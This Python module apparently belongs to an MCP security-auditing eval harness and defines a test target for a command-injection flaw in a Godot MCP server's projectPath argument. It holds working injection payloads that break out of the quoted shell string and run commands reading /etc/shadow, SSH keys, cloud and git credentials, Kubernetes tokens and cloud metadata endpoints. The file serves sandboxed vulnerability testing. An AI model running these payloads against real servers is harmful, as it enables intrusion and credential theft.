"""CVE-2026-25546: @coding-solo/godot-mcp command injection (CWE-78).

executeOperation builds a shell string `"<godot>" --headless --path "<projectPath>" ...` and runs
it through exec() (a shell). projectPath is wrapped in double quotes but not escaped, so a
projectPath that closes the quote injects an arbitrary command (reach: command_execution). 0.1.1
builds an argument array and calls execFile(godotPath, args), so projectPath reaches Godot as one
literal argument with no shell.

Every executeOperation handler first checks existsSync(join(projectPath, 'project.godot')), so each
exploit's projectPath is also a real baked directory carrying project.godot (baked into the image
by docker/bake_projects.mjs from the same specs), letting the guard pass while the injection still
fires. The external godot CLI is a benign stub inside the image: it only passes the server's
`<godot> --version` validation and exits cleanly, so the injected command (appended to the shell
line by the real server) is what produces output. The flaw lives in the real server code, not the
stub. One exploit per kept place names the location it reads; the benign call carries no projectPath
and is never aimed.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

WORKDIR = "/app"  # the compiled server is /app/build/index.js; kept coordinates are absolute

# One (place_id, command) per command_execution-reachable kept place. These are the same specs the
# image bakes into its injection-carrying project directories (docker/bake_projects.mjs), so the
# exploit's projectPath and the baked directory name cannot drift.
_SPECS: tuple[tuple[str, str], ...] = (
    ("process-account-identity", "whoami"),
    ("etc-shadow", "cat /etc/shadow"),
    ("container-hostname", "hostname"),
    ("aws-credentials", "cat /tmp/.aws/credentials"),
    ("gcloud-adc", "cat /tmp/.config/gcloud/application_default_credentials.json"),
    ("azure-profile", "cat /tmp/.azure/azureProfile.json"),
    ("ssh-private-key", "cat /tmp/.ssh/id_rsa"),
    ("shell-history", "cat /tmp/.bash_history"),
    ("git-credentials", "cat /tmp/.git-credentials"),
    ("npmrc", "cat /tmp/.npmrc"),
    ("gh-hosts", "cat /tmp/.config/gh/hosts.yml"),
    ("docker-config", "cat /tmp/.docker/config.json"),
    ("kube-config", "cat /tmp/.kube/config"),
    ("pgpass", "cat /tmp/.pgpass"),
    ("mysql-client-cnf", "cat /tmp/.my.cnf"),
    ("mongorc", "cat /tmp/.mongorc.js"),
    ("mysql-system-cnf", "cat /etc/mysql/my.cnf"),
    ("proc-environ", "printenv MCP_UPSTREAM_SECRET"),
    ("run-secrets", "cat /run/secrets/db_password"),
    ("k8s-sa-token", "cat /var/run/secrets/kubernetes.io/serviceaccount/token"),
    ("imds", "wget -qO- -T 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("ecs-task-credentials", "wget -qO- -T 5 http://169.254.170.2/v2/credentials/"),
    ("eks-pod-identity", "wget -qO- -T 5 http://169.254.170.23/v1/credentials"),
    ("etc-hosts", "cat /etc/hosts"),
    ("auth-log", "cat /var/log/auth.log"),
)

# Every exploit's projectPath carries the quote-break marker `";`; the benign call carries no
# arguments, so it is never aimed.
AIM = re.compile(r'";')


def _project_path(place_id: str, cmd: str) -> str:
    return f'/p/{place_id}";{cmd};"'


def _exploit(place_id: str, cmd: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    project_path = _project_path(place_id, cmd)

    async def run(places: Places, client: MCPClientPort) -> None:
        await client.call_tool(
            "create_scene",
            {"projectPath": project_path, "scenePath": "/p/scene.tscn", "rootNodeType": "Node2D"},
        )

    run.__name__ = f"exploit_{place_id.replace('-', '_')}"
    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool("get_godot_version", {})


KEPT_PLACES: tuple[str, ...] = tuple(place_id for place_id, _ in _SPECS)

TARGET = CVETarget(
    cve_id="CVE-2026-25546",
    severity="CVSS 7.5 (v3.1, placeholder)",
    mechanism=MechanismClass.COMMAND_EXECUTION,
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-25546-godot-mcp",),
    server_image="holdout-2026-25546-godot-mcp",
    patched_image="holdout-2026-25546-godot-mcp-patched",
    planting_host=PlantingHost(SymbolicUser.UNPRIVILEGED, WORKDIR, has_network=False),
    builder=command_injection_env,
    exploits=tuple(_exploit(place_id, cmd) for place_id, cmd in _SPECS),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Command injection (CWE-78): an unescaped projectPath in create_scene closes the quoted "
        "path in executeOperation's shell string and runs an arbitrary command in the server's "
        "container through exec()."
    ),
    tools_filter=None,
)
